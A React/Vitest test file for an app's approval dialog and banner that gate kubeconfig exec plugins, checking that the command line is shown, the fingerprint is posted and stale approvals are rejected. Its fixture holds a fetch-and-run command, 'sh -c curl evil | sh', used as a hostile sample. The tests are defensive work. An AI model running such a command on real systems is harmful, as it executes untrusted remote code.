import React from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { ContextAuthBanner } from '../../src/renderer/components/ContextAuthBanner';
import { EXEC_RUN_WARNING, ExecApprovalModal } from '../../src/renderer/components/ExecApprovalModal';
import {
  type ContextHealth,
  type SensitiveAuth,
  pendingApprovalsFromImport,
  useContextHealthStore,
} from '../../src/renderer/state/contextHealth';

const FP = 'a'.repeat(64);

const evilSensitive: SensitiveAuth = {
  exec: {
    command: 'sh',
    args: ['-c', 'curl evil | sh'],
    env_names: ['MARKER', 'AWS_PROFILE'],
    api_version: 'client.authentication.k8s.io/v1beta1',
    command_line: "sh -c 'curl evil | sh'",
  },
  fingerprint: FP,
};

const oidcSensitive: SensitiveAuth = {
  auth_provider: 'oidc',
  file_refs: [{ field: 'user.tokenFile', path: '/home/me/token' }],
  fingerprint: 'b'.repeat(64),
};

function jsonResponse(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json' } });
}

let fetchMock: ReturnType<typeof vi.fn>;
let queryClient: QueryClient;
let currentHealth: ContextHealth;
let approveResult: { body: unknown; status: number };

beforeEach(() => {
  useContextHealthStore.getState().clear();
  (window as any).electronAPI = { getDaemonConfig: vi.fn().mockResolvedValue({ port: 4242, token: 'tok' }) };
  currentHealth = {
    context: 'evil',
    state: 'error',
    kind: 'EXEC_APPROVAL_REQUIRED',
    message: 'Context "evil" runs a command',
    plugin_command: "sh -c 'curl evil | sh'",
    sensitive: evilSensitive,
  };
  approveResult = { body: { context: 'evil', state: 'ok', kind: '' }, status: 200 };
  fetchMock = vi.fn(async (url: string, init?: RequestInit) => {
    if (url.includes('/api/context-health')) return jsonResponse(currentHealth);
    if (url.endsWith('/api/contexts/approve-exec') && init?.method === 'POST') {
      return jsonResponse(approveResult.body, approveResult.status);
    }
    if (url.endsWith('/api/contexts/reauth')) return jsonResponse(currentHealth);
    return jsonResponse({}, 404);
  });
  vi.stubGlobal('fetch', fetchMock);
  queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
});

afterEach(() => {
  queryClient.clear();
  vi.unstubAllGlobals();
  delete (window as any).electronAPI;
});

function withQuery(ui: React.ReactElement) {
  return render(<QueryClientProvider client={queryClient}>{ui}</QueryClientProvider>);
}

const approveCalls = () => fetchMock.mock.calls.filter(([u]) => String(u).endsWith('/api/contexts/approve-exec'));

describe('ExecApprovalModal', () => {
  test('renders full command line, env names, auth-provider, file paths and the warning', () => {
    withQuery(
      <ExecApprovalModal
        items={[{ name: 'evil', sensitive: evilSensitive }, { name: 'oidc', sensitive: oidcSensitive }]}
        onClose={vi.fn()}
      />,
    );
    const dialog = screen.getByRole('dialog');
    const evil = within(dialog).getByRole('region', { name: 'Context evil' });
    expect(within(evil).getByLabelText('Command line')).toHaveTextContent("sh -c 'curl evil | sh'");
    expect(evil).toHaveTextContent('MARKER, AWS_PROFILE');
    expect(evil).toHaveTextContent(EXEC_RUN_WARNING);
    const oidc = within(dialog).getByRole('region', { name: 'Context oidc' });
    expect(oidc).toHaveTextContent('oidc');
    expect(oidc).toHaveTextContent('/home/me/token');
    expect(within(oidc).queryByLabelText('Command line')).toBeNull();
  });

  test('Approve posts the fingerprint; declining the rest closes the dialog', async () => {
    const onClose = vi.fn();
    const onDecided = vi.fn();
    withQuery(
      <ExecApprovalModal
        items={[{ name: 'evil', sensitive: evilSensitive }, { name: 'oidc', sensitive: oidcSensitive }]}
        onClose={onClose}
        onDecided={onDecided}
      />,
    );
    const evil = screen.getByRole('region', { name: 'Context evil' });
    await act(async () => {
      fireEvent.click(within(evil).getByRole('button', { name: 'Approve' }));
    });
    await waitFor(() => expect(evil).toHaveTextContent('Approved'));
    expect(approveCalls()).toHaveLength(1);
    expect(approveCalls()[0][1]).toMatchObject({ method: 'POST', body: JSON.stringify({ context: 'evil', fingerprint: FP }) });
    expect(useContextHealthStore.getState().byContext.evil?.state).toBe('ok');
    expect(onDecided).toHaveBeenCalledWith('evil', true, expect.objectContaining({ state: 'ok' }));
    expect(onClose).not.toHaveBeenCalled();

    const oidc = screen.getByRole('region', { name: 'Context oidc' });
    await act(async () => {
      fireEvent.click(within(oidc).getByRole('button', { name: "Don't approve" }));
    });
    expect(onDecided).toHaveBeenCalledWith('oidc', false);
    expect(approveCalls()).toHaveLength(1);
    await waitFor(() => expect(onClose).toHaveBeenCalled());
  });

  test('a rejected (stale) approval shows the error and keeps the choice open', async () => {
    approveResult = { body: { error: 'fingerprint does not match' }, status: 409 };
    const onClose = vi.fn();
    withQuery(<ExecApprovalModal items={[{ name: 'evil', sensitive: evilSensitive }]} onClose={onClose} />);
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
    });
    await waitFor(() => expect(screen.getByRole('alert')).toHaveTextContent('fingerprint does not match'));
    expect(screen.getByRole('button', { name: 'Approve' })).toBeEnabled();
    expect(onClose).not.toHaveBeenCalled();
  });
});

describe('ContextAuthBanner EXEC_APPROVAL_REQUIRED', () => {
  test('shows the command and opens the approval dialog; approving clears the banner', async () => {
    withQuery(<ContextAuthBanner context="evil" />);
    const alert = await screen.findByRole('alert');
    expect(alert).toHaveTextContent('Approval required for evil');
    expect(screen.getByLabelText('Command to approve')).toHaveTextContent("sh -c 'curl evil | sh'");
    expect(screen.queryByRole('button', { name: 'Retry' })).toBeNull();

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Review & approve' }));
    });
    const dialog = screen.getByRole('dialog');
    expect(dialog).toHaveTextContent(EXEC_RUN_WARNING);
    await act(async () => {
      fireEvent.click(within(dialog).getByRole('button', { name: 'Approve' }));
    });
    await waitFor(() => expect(screen.queryByText('Approval required for evil')).toBeNull());
    expect(approveCalls()).toHaveLength(1);
  });

  test('window focus does not auto-retry while approval is pending', async () => {
    withQuery(<ContextAuthBanner context="evil" />);
    await screen.findByRole('alert');
    await act(async () => { window.dispatchEvent(new Event('focus')); });
    expect(fetchMock.mock.calls.some(([u]) => String(u).endsWith('/api/contexts/reauth'))).toBe(false);
  });
});

describe('pendingApprovalsFromImport', () => {
  test('extracts only contexts that require approval', () => {
    expect(
      pendingApprovalsFromImport({
        status: 'ok',
        contexts: [
          { name: 'evil', requires_approval: true, sensitive: evilSensitive },
          { name: 'fine', requires_approval: false, sensitive: oidcSensitive },
          { name: 'plain', requires_approval: false },
        ],
      }),
    ).toEqual([{ name: 'evil', sensitive: expect.objectContaining({ fingerprint: FP }) }]);
    expect(pendingApprovalsFromImport({ status: 'ok' })).toEqual([]);
    expect(pendingApprovalsFromImport(null)).toEqual([]);
  });
});
